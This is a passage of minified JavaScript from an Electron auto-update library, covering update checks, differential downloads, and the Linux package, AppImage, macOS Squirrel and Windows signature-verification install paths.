    checkIfUpdateSupported(v) {
      const w = v?.minimumSystemVersion,
        _ = (0, c.release)();
      if (w)
        try {
          if ((0, e.lt)(_, w))
            return (
              this._logger.info(
                `Current OS version ${_} is less than the minimum OS version required ${w} for version ${_}`
              ),
              !1
            );
        } catch (g) {
          this._logger.warn(
            `Failed to compare current OS version(${_}) with minimum OS version(${w}): ${(
              g.message || g
            ).toString()}`
          );
        }
      return !0;
    }
    async getUpdateInfoAndProvider() {
      await this.app.whenReady(),
        this.clientPromise == null &&
        (this.clientPromise = this.configOnDisk.value.then((_) =>
          (0, m.createClient)(_, this, this.createProviderRuntimeOptions())
        ));
      const v = await this.clientPromise,
        w = await this.stagingUserIdPromise.value;
      return (
        v.setRequestHeaders(
          this.computeFinalHeaders({ "x-user-staging-id": w })
        ),
        { info: await v.getLatestVersion(), provider: v }
      );
    }
    createProviderRuntimeOptions() {
      return {
        isUseMultipleRangeRequest: !0,
        platform:
          this._testOnlyOptions == null
            ? process.platform
            : this._testOnlyOptions.platform,
        executor: this.httpExecutor,
      };
    }
    async doCheckForUpdates() {
      this.emit("checking-for-update");
      const v = await this.getUpdateInfoAndProvider(),
        w = v.info;
      if (!(await this.isUpdateAvailable(w)))
        return (
          this._logger.info(
            `Update for version ${this.currentVersion.format()} is not available (latest version: ${w.version
            }, downgrade is ${this.allowDowngrade ? "allowed" : "disallowed"}).`
          ),
          this.emit("update-not-available", w),
          { isUpdateAvailable: !1, versionInfo: w, updateInfo: w }
        );
      (this.updateInfoAndProvider = v), this.onUpdateAvailable(w);
      const _ = new a.CancellationToken();
      return {
        isUpdateAvailable: !0,
        versionInfo: w,
        updateInfo: w,
        cancellationToken: _,
        downloadPromise: this.autoDownload ? this.downloadUpdate(_) : null,
      };
    }
    onUpdateAvailable(v) {
      this._logger.info(
        `Found version ${v.version} (url: ${(0, a.asArray)(v.files)
          .map((w) => w.url)
          .join(", ")})`
      ),
        this.emit("update-available", v);
    }
    downloadUpdate(v = new a.CancellationToken()) {
      const w = this.updateInfoAndProvider;
      if (w == null) {
        const g = new Error("Please check update first");
        return this.dispatchError(g), Promise.reject(g);
      }
      if (this.downloadPromise != null)
        return (
          this._logger.info("Downloading update (already in progress)"),
          this.downloadPromise
        );
      this._logger.info(
        `Downloading update from ${(0, a.asArray)(w.info.files)
          .map((g) => g.url)
          .join(", ")}`
      );
      const _ = (g) => {
        if (!(g instanceof a.CancellationError))
          try {
            this.dispatchError(g);
          } catch (D) {
            this._logger.warn(`Cannot dispatch error event: ${D.stack || D}`);
          }
        return g;
      };
      return (
        (this.downloadPromise = this.doDownloadUpdate({
          updateInfoAndProvider: w,
          requestHeaders: this.computeRequestHeaders(w.provider),
          cancellationToken: v,
          disableWebInstaller: this.disableWebInstaller,
          disableDifferentialDownload: this.disableDifferentialDownload,
        })
          .catch((g) => {
            throw _(g);
          })
          .finally(() => {
            this.downloadPromise = null;
          })),
        this.downloadPromise
      );
    }
    dispatchError(v) {
      this.emit("error", v, (v.stack || v).toString());
    }
    dispatchUpdateDownloaded(v) {
      this.emit(A.UPDATE_DOWNLOADED, v);
    }
    async loadUpdateConfig() {
      return (
        this._appUpdateConfigPath == null &&
        (this._appUpdateConfigPath = this.app.appUpdateConfigPath),
        (0, t.load)(await (0, f.readFile)(this._appUpdateConfigPath, "utf-8"))
      );
    }
    computeRequestHeaders(v) {
      const w = v.fileExtraDownloadHeaders;
      if (w != null) {
        const _ = this.requestHeaders;
        return _ == null ? w : { ...w, ..._ };
      }
      return this.computeFinalHeaders({ accept: "*/*" });
    }
    async getOrCreateStagingUserId() {
      const v = l.join(this.app.userDataPath, ".updaterId");
      try {
        const _ = await (0, f.readFile)(v, "utf-8");
        if (a.UUID.check(_)) return _;
        this._logger.warn(
          `Staging user id file exists, but content was invalid: ${_}`
        );
      } catch (_) {
        _.code !== "ENOENT" &&
          this._logger.warn(
            `Couldn't read staging user ID, creating a blank one: ${_}`
          );
      }
      const w = a.UUID.v5((0, i.randomBytes)(4096), a.UUID.OID);
      this._logger.info(`Generated new staging user ID: ${w}`);
      try {
        await (0, f.outputFile)(v, w);
      } catch (_) {
        this._logger.warn(`Couldn't write out staging user ID: ${_}`);
      }
      return w;
    }
    get isAddNoCacheQuery() {
      const v = this.requestHeaders;
      if (v == null) return !0;
      for (const w of Object.keys(v)) {
        const _ = w.toLowerCase();
        if (_ === "authorization" || _ === "private-token") return !1;
      }
      return !0;
    }
    async getOrCreateDownloadHelper() {
      let v = this.downloadedUpdateHelper;
      if (v == null) {
        const w = (await this.configOnDisk.value).updaterCacheDirName,
          _ = this._logger;
        w == null &&
          _.error(
            "updaterCacheDirName is not specified in app-update.yml Was app build using at least electron-builder 20.34.0?"
          );
        const g = l.join(this.app.baseCachePath, w || this.app.name);
        _.debug != null && _.debug(`updater cache dir: ${g}`),
          (v = new o.DownloadedUpdateHelper(g)),
          (this.downloadedUpdateHelper = v);
      }
      return v;
    }
    async executeDownload(v) {
      const w = v.fileInfo,
        _ = {
          headers: v.downloadUpdateOptions.requestHeaders,
          cancellationToken: v.downloadUpdateOptions.cancellationToken,
          sha2: w.info.sha2,
          sha512: w.info.sha512,
        };
      this.listenerCount(A.DOWNLOAD_PROGRESS) > 0 &&
        (_.onProgress = (ie) => this.emit(A.DOWNLOAD_PROGRESS, ie));
      const g = v.downloadUpdateOptions.updateInfoAndProvider.info,
        D = g.version,
        O = w.packageInfo;
      function N() {
        const ie = decodeURIComponent(v.fileInfo.url.pathname);
        return ie.endsWith(`.${v.fileExtension}`)
          ? l.basename(ie)
          : v.fileInfo.info.url;
      }
      const L = await this.getOrCreateDownloadHelper(),
        F = L.cacheDirForPendingUpdate;
      await (0, f.mkdir)(F, { recursive: !0 });
      const $ = N();
      let k = l.join(F, $);
      const M =
        O == null
          ? null
          : l.join(F, `package-${D}${l.extname(O.path) || ".7z"}`),
        K = async (ie) => (
          await L.setDownloadedFile(k, M, g, w, $, ie),
          await v.done({ ...g, downloadedFile: k }),
          M == null ? [k] : [k, M]
        ),
        G = this._logger,
        ne = await L.validateDownloadedPath(k, g, w, G);
      if (ne != null) return (k = ne), await K(!1);
      const se = async () => (
        await L.clear().catch(() => { }),
        await (0, f.unlink)(k).catch(() => { })
      ),
        ce = await (0, o.createTempUpdateFile)(`temp-${$}`, F, G);
      try {
        await v.task(ce, _, M, se),
          await (0, a.retry)(
            () => (0, f.rename)(ce, k),
            60,
            500,
            0,
            0,
            (ie) => ie instanceof Error && /^EBUSY:/.test(ie.message)
          );
      } catch (ie) {
        throw (
          (await se(),
            ie instanceof a.CancellationError &&
            (G.info("cancelled"), this.emit("update-cancelled", g)),
            ie)
        );
      }
      return (
        G.info(`New version ${D} has been downloaded to ${k}`), await K(!0)
      );
    }
    async differentialDownloadInstaller(v, w, _, g, D) {
      try {
        if (
          this._testOnlyOptions != null &&
          !this._testOnlyOptions.isUseDifferentialDownload
        )
          return !0;
        const O = (0, y.blockmapFiles)(
          v.url,
          this.app.version,
          w.updateInfoAndProvider.info.version
        );
        this._logger.info(`Download block maps (old: "${O[0]}", new: ${O[1]})`);
        const N = async ($) => {
          const k = await this.httpExecutor.downloadToBuffer($, {
            headers: w.requestHeaders,
            cancellationToken: w.cancellationToken,
          });
          if (k == null || k.length === 0)
            throw new Error(`Blockmap "${$.href}" is empty`);
          try {
            return JSON.parse((0, E.gunzipSync)(k).toString());
          } catch (M) {
            throw new Error(`Cannot parse blockmap "${$.href}", error: ${M}`);
          }
        },
          L = {
            newUrl: v.url,
            oldFile: l.join(this.downloadedUpdateHelper.cacheDir, D),
            logger: this._logger,
            newFile: _,
            isUseMultipleRangeRequest: g.isUseMultipleRangeRequest,
            requestHeaders: w.requestHeaders,
            cancellationToken: w.cancellationToken,
          };
        this.listenerCount(A.DOWNLOAD_PROGRESS) > 0 &&
          (L.onProgress = ($) => this.emit(A.DOWNLOAD_PROGRESS, $));
        const F = await Promise.all(O.map(($) => N($)));
        return (
          await new p.GenericDifferentialDownloader(
            v.info,
            this.httpExecutor,
            L
          ).download(F[0], F[1]),
          !1
        );
      } catch (O) {
        if (
          (this._logger.error(
            `Cannot download differentially, fallback to full download: ${O.stack || O
            }`
          ),
            this._testOnlyOptions != null)
        )
          throw O;
        return !0;
      }
    }
  };
  Ct.AppUpdater = S;
  function b(C) {
    const v = (0, e.prerelease)(C);
    return v != null && v.length > 0;
  }
  class R {
    info(v) { }
    warn(v) { }
    error(v) { }
  }
  return (Ct.NoOpLogger = R), Ct;
}
var Mu;
function Yt() {
  if (Mu) return Jt;
  (Mu = 1),
    Object.defineProperty(Jt, "__esModule", { value: !0 }),
    (Jt.BaseUpdater = void 0);
  const a = Nt,
    i = Mo();
  let c = class extends i.AppUpdater {
    constructor(f, t) {
      super(f, t),
        (this.quitAndInstallCalled = !1),
        (this.quitHandlerAdded = !1);
    }
    quitAndInstall(f = !1, t = !1) {
      this._logger.info("Install on explicit quitAndInstall"),
        this.install(f, f ? t : this.autoRunAppAfterInstall)
          ? setImmediate(() => {
            he.autoUpdater.emit("before-quit-for-update"), this.app.quit();
          })
          : (this.quitAndInstallCalled = !1);
    }
    executeDownload(f) {
      return super.executeDownload({
        ...f,
        done: (t) => (
          this.dispatchUpdateDownloaded(t),
          this.addQuitHandler(),
          Promise.resolve()
        ),
      });
    }
    get installerPath() {
      return this.downloadedUpdateHelper == null
        ? null
        : this.downloadedUpdateHelper.file;
    }
    install(f = !1, t = !1) {
      if (this.quitAndInstallCalled)
        return (
          this._logger.warn(
            "install call ignored: quitAndInstallCalled is set to true"
          ),
          !1
        );
      const r = this.downloadedUpdateHelper,
        l = this.installerPath,
        e = r == null ? null : r.downloadedFileInfo;
      if (l == null || e == null)
        return (
          this.dispatchError(
            new Error("No valid update available, can't quit and install")
          ),
          !1
        );
      this.quitAndInstallCalled = !0;
      try {
        return (
          this._logger.info(`Install: isSilent: ${f}, isForceRunAfter: ${t}`),
          this.doInstall({
            isSilent: f,
            isForceRunAfter: t,
            isAdminRightsRequired: e.isAdminRightsRequired,
          })
        );
      } catch (o) {
        return this.dispatchError(o), !1;
      }
    }
    addQuitHandler() {
      this.quitHandlerAdded ||
        !this.autoInstallOnAppQuit ||
        ((this.quitHandlerAdded = !0),
          this.app.onQuit((f) => {
            if (this.quitAndInstallCalled) {
              this._logger.info(
                "Update installer has already been triggered. Quitting application."
              );
              return;
            }
            if (!this.autoInstallOnAppQuit) {
              this._logger.info(
                "Update will not be installed on quit because autoInstallOnAppQuit is set to false."
              );
              return;
            }
            if (f !== 0) {
              this._logger.info(
                `Update will be not installed on quit because application is quitting with exit code ${f}`
              );
              return;
            }
            this._logger.info("Auto install update on quit"),
              this.install(!0, !1);
          }));
    }
    wrapSudo() {
      const { name: f } = this.app,
        t = `"${f} would like to update"`,
        r = this.spawnSyncLog(
          "which gksudo || which kdesudo || which pkexec || which beesu"
        ),
        l = [r];
      return (
        /kdesudo/i.test(r)
          ? (l.push("--comment", t), l.push("-c"))
          : /gksudo/i.test(r)
            ? l.push("--message", t)
            : /pkexec/i.test(r) && l.push("--disable-internal-agent"),
        l.join(" ")
      );
    }
    spawnSyncLog(f, t = [], r = {}) {
      this._logger.info(`Executing: ${f} with args: ${t}`);
      const l = (0, a.spawnSync)(f, t, {
        env: { ...process.env, ...r },
        encoding: "utf-8",
        shell: !0,
      }),
        { error: e, status: o, stdout: n, stderr: s } = l;
      if (e != null) throw (this._logger.error(s), e);
      if (o != null && o !== 0)
        throw (
          (this._logger.error(s),
            new Error(`Command ${f} exited with code ${o}`))
        );
      return n.trim();
    }
    async spawnLog(f, t = [], r = void 0, l = "ignore") {
      return (
        this._logger.info(`Executing: ${f} with args: ${t}`),
        new Promise((e, o) => {
          try {
            const n = { stdio: l, env: r, detached: !0 },
              s = (0, a.spawn)(f, t, n);
            s.on("error", (u) => {
              o(u);
            }),
              s.unref(),
              s.pid !== void 0 && e(!0);
          } catch (n) {
            o(n);
          }
        })
      );
    }
  };
  return (Jt.BaseUpdater = c), Jt;
}
var dr = {},
  hr = {},
  Bu;
function tc() {
  if (Bu) return hr;
  (Bu = 1),
    Object.defineProperty(hr, "__esModule", { value: !0 }),
    (hr.FileWithEmbeddedBlockMapDifferentialDownloader = void 0);
  const a = Et(),
    i = Zl(),
    c = Tl;
  let h = class extends i.DifferentialDownloader {
    async download() {
      const l = this.blockAwareFileInfo,
        e = l.size,
        o = e - (l.blockMapSize + 4);
      this.fileMetadataBuffer = await this.readRemoteBytes(o, e - 1);
      const n = f(
        this.fileMetadataBuffer.slice(0, this.fileMetadataBuffer.length - 4)
      );
      await this.doDownload(await t(this.options.oldFile), n);
    }
  };
  hr.FileWithEmbeddedBlockMapDifferentialDownloader = h;
  function f(r) {
    return JSON.parse((0, c.inflateRawSync)(r).toString());
  }
  async function t(r) {
    const l = await (0, a.open)(r, "r");
    try {
      const e = (await (0, a.fstat)(l)).size,
        o = Buffer.allocUnsafe(4);
      await (0, a.read)(l, o, 0, o.length, e - o.length);
      const n = Buffer.allocUnsafe(o.readUInt32BE(0));
      return (
        await (0, a.read)(l, n, 0, n.length, e - o.length - n.length),
        await (0, a.close)(l),
        f(n)
      );
    } catch (e) {
      throw (await (0, a.close)(l), e);
    }
  }
  return hr;
}
var ju;
function Hu() {
  if (ju) return dr;
  (ju = 1),
    Object.defineProperty(dr, "__esModule", { value: !0 }),
    (dr.AppImageUpdater = void 0);
  const a = Be(),
    i = Nt,
    c = Et(),
    h = be,
    f = ye,
    t = Yt(),
    r = tc(),
    l = nt(),
    e = Lt();
  let o = class extends t.BaseUpdater {
    constructor(s, u) {
      super(s, u);
    }
    isUpdaterActive() {
      return process.env.APPIMAGE == null
        ? (process.env.SNAP == null
          ? this._logger.warn(
            "APPIMAGE env is not defined, current application is not an AppImage"
          )
          : this._logger.info("SNAP env is defined, updater is disabled"),
          !1)
        : super.isUpdaterActive();
    }
    doDownloadUpdate(s) {
      const u = s.updateInfoAndProvider.provider,
        m = (0, l.findFile)(
          u.resolveFiles(s.updateInfoAndProvider.info),
          "AppImage",
          ["rpm", "deb", "pacman"]
        );
      return this.executeDownload({
        fileExtension: "AppImage",
        fileInfo: m,
        downloadUpdateOptions: s,
        task: async (E, y) => {
          const p = process.env.APPIMAGE;
          if (p == null)
            throw (0, a.newError)(
              "APPIMAGE env is not defined",
              "ERR_UPDATER_OLD_FILE_NOT_FOUND"
            );
          (s.disableDifferentialDownload ||
            (await this.downloadDifferential(m, p, E, u, s))) &&
            (await this.httpExecutor.download(m.url, E, y)),
            await (0, c.chmod)(E, 493);
        },
      });
    }
    async downloadDifferential(s, u, m, E, y) {
      try {
        const p = {
          newUrl: s.url,
          oldFile: u,
          logger: this._logger,
          newFile: m,
          isUseMultipleRangeRequest: E.isUseMultipleRangeRequest,
          requestHeaders: y.requestHeaders,
          cancellationToken: y.cancellationToken,
        };
        return (
          this.listenerCount(e.DOWNLOAD_PROGRESS) > 0 &&
          (p.onProgress = (A) => this.emit(e.DOWNLOAD_PROGRESS, A)),
          await new r.FileWithEmbeddedBlockMapDifferentialDownloader(
            s.info,
            this.httpExecutor,
            p
          ).download(),
          !1
        );
      } catch (p) {
        return (
          this._logger.error(
            `Cannot download differentially, fallback to full download: ${p.stack || p
            }`
          ),
          process.platform === "linux"
        );
      }
    }
    doInstall(s) {
      const u = process.env.APPIMAGE;
      if (u == null)
        throw (0, a.newError)(
          "APPIMAGE env is not defined",
          "ERR_UPDATER_OLD_FILE_NOT_FOUND"
        );
      (0, h.unlinkSync)(u);
      let m;
      const E = f.basename(u),
        y = this.installerPath;
      if (y == null)
        return (
          this.dispatchError(
            new Error("No valid update available, can't quit and install")
          ),
          !1
        );
      f.basename(y) === E || !/\d+\.\d+\.\d+/.test(E)
        ? (m = u)
        : (m = f.join(f.dirname(u), f.basename(y))),
        (0, i.execFileSync)("mv", ["-f", y, m]),
        m !== u && this.emit("appimage-filename-updated", m);
      const p = { ...process.env, APPIMAGE_SILENT_INSTALL: "true" };
      return (
        s.isForceRunAfter
          ? this.spawnLog(m, [], p)
          : ((p.APPIMAGE_EXIT_AFTER_INSTALL = "true"),
            (0, i.execFileSync)(m, [], { env: p })),
        !0
      );
    }
  };
  return (dr.AppImageUpdater = o), dr;
}
var pr = {},
  Gu;
function Vu() {
  if (Gu) return pr;
  (Gu = 1),
    Object.defineProperty(pr, "__esModule", { value: !0 }),
    (pr.DebUpdater = void 0);
  const a = Yt(),
    i = nt(),
    c = Lt();
  let h = class extends a.BaseUpdater {
    constructor(t, r) {
      super(t, r);
    }
    doDownloadUpdate(t) {
      const r = t.updateInfoAndProvider.provider,
        l = (0, i.findFile)(
          r.resolveFiles(t.updateInfoAndProvider.info),
          "deb",
          ["AppImage", "rpm", "pacman"]
        );
      return this.executeDownload({
        fileExtension: "deb",
        fileInfo: l,
        downloadUpdateOptions: t,
        task: async (e, o) => {
          this.listenerCount(c.DOWNLOAD_PROGRESS) > 0 &&
            (o.onProgress = (n) => this.emit(c.DOWNLOAD_PROGRESS, n)),
            await this.httpExecutor.download(l.url, e, o);
        },
      });
    }
    get installerPath() {
      var t, r;
      return (r =
        (t = super.installerPath) === null || t === void 0
          ? void 0
          : t.replace(/ /g, "\\ ")) !== null && r !== void 0
        ? r
        : null;
    }
    doInstall(t) {
      const r = this.wrapSudo(),
        l = /pkexec/i.test(r) ? "" : '"',
        e = this.installerPath;
      if (e == null)
        return (
          this.dispatchError(
            new Error("No valid update available, can't quit and install")
          ),
          !1
        );
      const o = ["dpkg", "-i", e, "||", "apt-get", "install", "-f", "-y"];
      return (
        this.spawnSyncLog(r, [`${l}/bin/bash`, "-c", `'${o.join(" ")}'${l}`]),
        t.isForceRunAfter && this.app.relaunch(),
        !0
      );
    }
  };
  return (pr.DebUpdater = h), pr;
}
var mr = {},
  Wu;
function zu() {
  if (Wu) return mr;
  (Wu = 1),
    Object.defineProperty(mr, "__esModule", { value: !0 }),
    (mr.PacmanUpdater = void 0);
  const a = Yt(),
    i = Lt(),
    c = nt();
  let h = class extends a.BaseUpdater {
    constructor(t, r) {
      super(t, r);
    }
    doDownloadUpdate(t) {
      const r = t.updateInfoAndProvider.provider,
        l = (0, c.findFile)(
          r.resolveFiles(t.updateInfoAndProvider.info),
          "pacman",
          ["AppImage", "deb", "rpm"]
        );
      return this.executeDownload({
        fileExtension: "pacman",
        fileInfo: l,
        downloadUpdateOptions: t,
        task: async (e, o) => {
          this.listenerCount(i.DOWNLOAD_PROGRESS) > 0 &&
            (o.onProgress = (n) => this.emit(i.DOWNLOAD_PROGRESS, n)),
            await this.httpExecutor.download(l.url, e, o);
        },
      });
    }
    get installerPath() {
      var t, r;
      return (r =
        (t = super.installerPath) === null || t === void 0
          ? void 0
          : t.replace(/ /g, "\\ ")) !== null && r !== void 0
        ? r
        : null;
    }
    doInstall(t) {
      const r = this.wrapSudo(),
        l = /pkexec/i.test(r) ? "" : '"',
        e = this.installerPath;
      if (e == null)
        return (
          this.dispatchError(
            new Error("No valid update available, can't quit and install")
          ),
          !1
        );
      const o = ["pacman", "-U", "--noconfirm", e];
      return (
        this.spawnSyncLog(r, [`${l}/bin/bash`, "-c", `'${o.join(" ")}'${l}`]),
        t.isForceRunAfter && this.app.relaunch(),
        !0
      );
    }
  };
  return (mr.PacmanUpdater = h), mr;
}
var gr = {},
  Yu;
function Ku() {
  if (Yu) return gr;
  (Yu = 1),
    Object.defineProperty(gr, "__esModule", { value: !0 }),
    (gr.RpmUpdater = void 0);
  const a = Yt(),
    i = Lt(),
    c = nt();
  let h = class extends a.BaseUpdater {
    constructor(t, r) {
      super(t, r);
    }
    doDownloadUpdate(t) {
      const r = t.updateInfoAndProvider.provider,
        l = (0, c.findFile)(
          r.resolveFiles(t.updateInfoAndProvider.info),
          "rpm",
          ["AppImage", "deb", "pacman"]
        );
      return this.executeDownload({
        fileExtension: "rpm",
        fileInfo: l,
        downloadUpdateOptions: t,
        task: async (e, o) => {
          this.listenerCount(i.DOWNLOAD_PROGRESS) > 0 &&
            (o.onProgress = (n) => this.emit(i.DOWNLOAD_PROGRESS, n)),
            await this.httpExecutor.download(l.url, e, o);
        },
      });
    }
    get installerPath() {
      var t, r;
      return (r =
        (t = super.installerPath) === null || t === void 0
          ? void 0
          : t.replace(/ /g, "\\ ")) !== null && r !== void 0
        ? r
        : null;
    }
    doInstall(t) {
      const r = this.wrapSudo(),
        l = /pkexec/i.test(r) ? "" : '"',
        e = this.spawnSyncLog("which zypper"),
        o = this.installerPath;
      if (o == null)
        return (
          this.dispatchError(
            new Error("No valid update available, can't quit and install")
          ),
          !1
        );
      let n;
      return (
        e
          ? (n = [
            e,
            "--no-refresh",
            "install",
            "--allow-unsigned-rpm",
            "-y",
            "-f",
            o,
          ])
          : (n = [
            this.spawnSyncLog("which dnf || which yum"),
            "-y",
            "install",
            o,
          ]),
        this.spawnSyncLog(r, [`${l}/bin/bash`, "-c", `'${n.join(" ")}'${l}`]),
        t.isForceRunAfter && this.app.relaunch(),
        !0
      );
    }
  };
  return (gr.RpmUpdater = h), gr;
}
var vr = {},
  Xu;
function Ju() {
  if (Xu) return vr;
  (Xu = 1),
    Object.defineProperty(vr, "__esModule", { value: !0 }),
    (vr.MacUpdater = void 0);
  const a = Be(),
    i = Et(),
    c = be,
    h = ye,
    f = Zc,
    t = Mo(),
    r = nt(),
    l = Nt,
    e = _r;
  let o = class extends t.AppUpdater {
    constructor(s, u) {
      super(s, u),
        (this.nativeUpdater = he.autoUpdater),
        (this.squirrelDownloadedUpdate = !1),
        this.nativeUpdater.on("error", (m) => {
          this._logger.warn(m), this.emit("error", m);
        }),
        this.nativeUpdater.on("update-downloaded", () => {
          (this.squirrelDownloadedUpdate = !0),
            this.debug("nativeUpdater.update-downloaded");
        });
    }
    debug(s) {
      this._logger.debug != null && this._logger.debug(s);
    }
    closeServerIfExists() {
      this.server &&
        (this.debug("Closing proxy server"),
          this.server.close((s) => {
            s &&
              this.debug(
                "proxy server wasn't already open, probably attempted closing again as a safety check before quit"
              );
          }));
    }
    async doDownloadUpdate(s) {
      let u = s.updateInfoAndProvider.provider.resolveFiles(
        s.updateInfoAndProvider.info
      );
      const m = this._logger,
        E = "sysctl.proc_translated";
      let y = !1;
      try {
        this.debug("Checking for macOS Rosetta environment"),
          (y = (0, l.execFileSync)("sysctl", [E], {
            encoding: "utf8",
          }).includes(`${E}: 1`)),
          m.info(`Checked for macOS Rosetta environment (isRosetta=${y})`);
      } catch (C) {
        m.warn(
          `sysctl shell command to check for macOS Rosetta environment failed: ${C}`
        );
      }
      let p = !1;
      try {
        this.debug("Checking for arm64 in uname");
        const v = (0, l.execFileSync)("uname", ["-a"], {
          encoding: "utf8",
        }).includes("ARM");
        m.info(`Checked 'uname -a': arm64=${v}`), (p = p || v);
      } catch (C) {
        m.warn(`uname shell command to check for arm64 failed: ${C}`);
      }
      p = p || process.arch === "arm64" || y;
      const A = (C) => {
        var v;
        return (
          C.url.pathname.includes("arm64") ||
          ((v = C.info.url) === null || v === void 0
            ? void 0
            : v.includes("arm64"))
        );
      };
      p && u.some(A)
        ? (u = u.filter((C) => p === A(C)))
        : (u = u.filter((C) => !A(C)));
      const S = (0, r.findFile)(u, "zip", ["pkg", "dmg"]);
      if (S == null)
        throw (0, a.newError)(
          `ZIP file not provided: ${(0, a.safeStringifyJson)(u)}`,
          "ERR_UPDATER_ZIP_FILE_NOT_FOUND"
        );
      const b = s.updateInfoAndProvider.provider,
        R = "update.zip";
      return this.executeDownload({
        fileExtension: "zip",
        fileInfo: S,
        downloadUpdateOptions: s,
        task: async (C, v) => {
          const w = h.join(this.downloadedUpdateHelper.cacheDir, R),
            _ = () =>
              (0, i.pathExistsSync)(w)
                ? !s.disableDifferentialDownload
                : (m.info(
                  "Unable to locate previous update.zip for differential download (is this first install?), falling back to full download"
                ),
                  !1);
          let g = !0;
          _() && (g = await this.differentialDownloadInstaller(S, s, C, b, R)),
            g && (await this.httpExecutor.download(S.url, C, v));
        },
        done: async (C) => {
          if (!s.disableDifferentialDownload)
            try {
              const v = h.join(this.downloadedUpdateHelper.cacheDir, R);
              await (0, i.copyFile)(C.downloadedFile, v);
            } catch (v) {
              this._logger.warn(
                `Unable to copy file for caching for future differential downloads: ${v.message}`
              );
            }
          return this.updateDownloaded(S, C);
        },
      });
    }
    async updateDownloaded(s, u) {
      var m;
      const E = u.downloadedFile,
        y =
          (m = s.info.size) !== null && m !== void 0
            ? m
            : (await (0, i.stat)(E)).size,
        p = this._logger,
        A = `fileToProxy=${s.url.href}`;
      this.closeServerIfExists(),
        this.debug(`Creating proxy server for native Squirrel.Mac (${A})`),
        (this.server = (0, f.createServer)()),
        this.debug(`Proxy server for native Squirrel.Mac is created (${A})`),
        this.server.on("close", () => {
          p.info(`Proxy server for native Squirrel.Mac is closed (${A})`);
        });
      const S = (b) => {
        const R = b.address();
        return typeof R == "string" ? R : `http://127.0.0.1:${R?.port}`;
      };
      return await new Promise((b, R) => {
        const C = (0, e.randomBytes)(64)
          .toString("base64")
          .replace(/\//g, "_")
          .replace(/\+/g, "-"),
          v = Buffer.from(`autoupdater:${C}`, "ascii"),
          w = `/${(0, e.randomBytes)(64).toString("hex")}.zip`;
        this.server.on("request", (_, g) => {
          const D = _.url;
          if ((p.info(`${D} requested`), D === "/")) {
            if (
              !_.headers.authorization ||
              _.headers.authorization.indexOf("Basic ") === -1
            ) {
              (g.statusCode = 401),
                (g.statusMessage = "Invalid Authentication Credentials"),
                g.end(),
                p.warn("No authenthication info");
              return;
            }
            const L = _.headers.authorization.split(" ")[1],
              F = Buffer.from(L, "base64").toString("ascii"),
              [$, k] = F.split(":");
            if ($ !== "autoupdater" || k !== C) {
              (g.statusCode = 401),
                (g.statusMessage = "Invalid Authentication Credentials"),
                g.end(),
                p.warn("Invalid authenthication credentials");
              return;
            }
            const M = Buffer.from(`{ "url": "${S(this.server)}${w}" }`);
            g.writeHead(200, {
              "Content-Type": "application/json",
              "Content-Length": M.length,
            }),
              g.end(M);
            return;
          }
          if (!D.startsWith(w)) {
            p.warn(`${D} requested, but not supported`),
              g.writeHead(404),
              g.end();
            return;
          }
          p.info(`${w} requested by Squirrel.Mac, pipe ${E}`);
          let O = !1;
          g.on("finish", () => {
            O || (this.nativeUpdater.removeListener("error", R), b([]));
          });
          const N = (0, c.createReadStream)(E);
          N.on("error", (L) => {
            try {
              g.end();
            } catch (F) {
              p.warn(`cannot end response: ${F}`);
            }
            (O = !0),
              this.nativeUpdater.removeListener("error", R),
              R(new Error(`Cannot pipe "${E}": ${L}`));
          }),
            g.writeHead(200, {
              "Content-Type": "application/zip",
              "Content-Length": y,
            }),
            N.pipe(g);
        }),
          this.debug(
            `Proxy server for native Squirrel.Mac is starting to listen (${A})`
          ),
          this.server.listen(0, "127.0.0.1", () => {
            this.debug(
              `Proxy server for native Squirrel.Mac is listening (address=${S(
                this.server
              )}, ${A})`
            ),
              this.nativeUpdater.setFeedURL({
                url: S(this.server),
                headers: {
                  "Cache-Control": "no-cache",
                  Authorization: `Basic ${v.toString("base64")}`,
                },
              }),
              this.dispatchUpdateDownloaded(u),
              this.autoInstallOnAppQuit
                ? (this.nativeUpdater.once("error", R),
                  this.nativeUpdater.checkForUpdates())
                : b([]);
          });
      });
    }
    handleUpdateDownloaded() {
      this.autoRunAppAfterInstall
        ? this.nativeUpdater.quitAndInstall()
        : this.app.quit(),
        this.closeServerIfExists();
    }
    quitAndInstall() {
      this.squirrelDownloadedUpdate
        ? this.handleUpdateDownloaded()
        : (this.nativeUpdater.on("update-downloaded", () =>
          this.handleUpdateDownloaded()
        ),
          this.autoInstallOnAppQuit || this.nativeUpdater.checkForUpdates());
    }
  };
  return (vr.MacUpdater = o), vr;
}
var wr = {},
  Gr = {},
  Qu;
function Rd() {
  if (Qu) return Gr;
  (Qu = 1),
    Object.defineProperty(Gr, "__esModule", { value: !0 }),
    (Gr.verifySignature = f);
  const a = Be(),
    i = Nt,
    c = Ar,
    h = ye;
  function f(e, o, n) {
    return new Promise((s, u) => {
      const m = o.replace(/'/g, "''");
      n.info(`Verifying signature ${m}`),
        (0, i.execFile)(
          'set "PSModulePath=" & chcp 65001 >NUL & powershell.exe',
          [
            "-NoProfile",
            "-NonInteractive",
            "-InputFormat",
            "None",
            "-Command",
            `"Get-AuthenticodeSignature -LiteralPath '${m}' | ConvertTo-Json -Compress"`,
          ],
          { shell: !0, timeout: 20 * 1e3 },
          (E, y, p) => {
            var A;
            try {
              if (E != null || p) {
                r(n, E, p, u), s(null);
                return;
              }
              const S = t(y);
              if (S.Status === 0) {
                try {
                  const v = h.normalize(S.Path),
                    w = h.normalize(o);
                  if (
                    (n.info(`LiteralPath: ${v}. Update Path: ${w}`), v !== w)
                  ) {
                    r(
                      n,
                      new Error(`LiteralPath of ${v} is different than ${w}`),
                      p,
                      u
                    ),
                      s(null);
                    return;
                  }
                } catch (v) {
                  n.warn(
                    `Unable to verify LiteralPath of update asset due to missing data.Path. Skipping this step of validation. Message: ${(A = v.message) !== null && A !== void 0 ? A : v.stack
                    }`
                  );
                }
                const R = (0, a.parseDn)(S.SignerCertificate.Subject);
                let C = !1;
                for (const v of e) {
                  const w = (0, a.parseDn)(v);
                  if (
                    (w.size
                      ? (C = Array.from(w.keys()).every(
                        (g) => w.get(g) === R.get(g)
                      ))
                      : v === R.get("CN") &&
                      (n.warn(
                        `Signature validated using only CN ${v}. Please add your full Distinguished Name (DN) to publisherNames configuration`
                      ),
                        (C = !0)),
                      C)
                  ) {
                    s(null);
                    return;
                  }
                }
              }
              const b =
                `publisherNames: ${e.join(" | ")}, raw info: ` +
                JSON.stringify(S, (R, C) => (R === "RawData" ? void 0 : C), 2);
              n.warn(
